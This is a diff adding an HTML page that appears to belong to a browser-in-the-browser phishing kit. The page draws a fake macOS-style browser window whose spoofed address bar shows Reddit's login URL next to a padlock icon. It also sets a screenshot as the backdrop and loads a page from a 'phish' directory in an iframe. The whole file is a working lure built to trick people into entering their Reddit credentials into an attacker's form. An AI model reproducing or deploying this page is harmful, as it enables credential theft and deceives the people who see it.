@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<link rel="icon" type="image/x-icon" href="/logo.jpg">
+</head>
+<body>
+<style>
+body {
+  background-image: url('/ss.png');
+    background-repeat: no-repeat;
+  background-size: 100% 100%;
+}
+</style>
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar" class="outer yosemite">
+		<span class="dots">
+	     <div id="exit" class="dot red"></div>
+	     <div id="minimize" class="dot amber"></div>
+	     <div id="maximize" class="dot green"></div>
+	    </span>
+
+	     <span id="logo-description">Sign in to your account now</span>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://www.reddit.com</span>
+		<span id="domain-path">/auth/reddit/login</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="/BITB/phish/index.html" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
